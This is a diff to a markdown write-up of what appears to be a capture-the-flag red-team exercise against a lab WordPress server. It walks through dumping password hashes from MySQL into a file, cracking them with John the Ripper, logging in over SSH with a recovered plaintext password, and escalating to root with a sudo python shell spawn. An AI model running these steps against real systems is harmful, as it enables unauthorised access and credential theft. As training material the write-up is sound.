@@ -78,3 +78,35 @@ With the MySQL database credentials, the Red Team was able to extract the passwo
 ![Hashes Only](Images/hashes_only.PNG)
 #
 ![Hashes Only](Images/hashes_verbose.PNG)
+#
+The hashes were then extracted from MySQL to .txt file located in the /tmp directory.
+**Command:**`SELECT * FROM wp_users INTO OUTFILE '/tmp/wp_hashes.txt';`
+#
+![Hashes Extracted](Images/hashes_to_outfile.PNG)
+
+Before exiting MySQL, two sensitive pieces of material,`flag3` and `flag4` were found within the wp_posts table.
+**Command:**SELECT * FROM wp_posts;
+#
+![Flag3 and Flag4](Images/flag3_flag4.PNG)
+
+After exiting MySQL, the program John the Ripper (JtR) was then used to decipher the password hash for Steven.
+**Command:**`john wp_hashes.txt` OR `john wp_hashes.txt --wordlist=/usr/share/wordlist/rockyou.txt`
+#
+![JtR](Images/JtR.PNG)
+#
+![Steven's Password](Images/steven_pwd.PNG)
+#
+With Steven's credentials, the Red Team was able to access his account and check for his current privelages.
+**Commands:**`ssh steven@192.168.1.110`;`yes`;`pink84`;`sudo -l`
+#
+![Steven's Initial Privelages](Images/steven_initial_privelages.PNG)
+
+Steven's current privelages allowed him to run python scripts. By using the following command, the Red Team was able to escalate his privelages to root.
+**Command:**`sudo python -c 'import pty;pty.spawn("/bin/bash")'`;`sudo -l`
+#
+![Steven's Root Privelages](Images/steven_escalated_privelages.PNG)
+
+By increasing Steven's privelages to root, this allowed for the Red Team to freely move through the website and access or change any file desired. The final sensitive document,`flag4.txt`, was discovered within the root directory.
+#
+![Flag4.txt](Images/flag4.PNG)
+steven_escalated_privelages
